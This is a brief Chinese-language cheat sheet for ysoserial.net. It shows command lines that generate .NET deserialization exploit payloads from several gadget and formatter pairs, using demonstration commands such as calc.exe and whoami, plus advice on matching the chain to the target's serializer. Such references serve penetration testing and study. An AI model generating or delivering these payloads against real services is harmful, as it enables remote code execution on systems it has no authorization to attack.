# ysoserial.net 常用用法

ysoserial.net 适合 .NET 反序列化 payload 生成。常用参数：`-g` gadget，`-f` formatter，`-c` command。

```powershell
.\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"
```

```powershell
.\ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c "whoami"
```

```powershell
.\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "whoami"
```

```powershell
.\ysoserial.exe -l
```

ysoserial.net 的关键是 formatter 和 gadget 对得上。先确认入口使用的序列化组件，再选链。
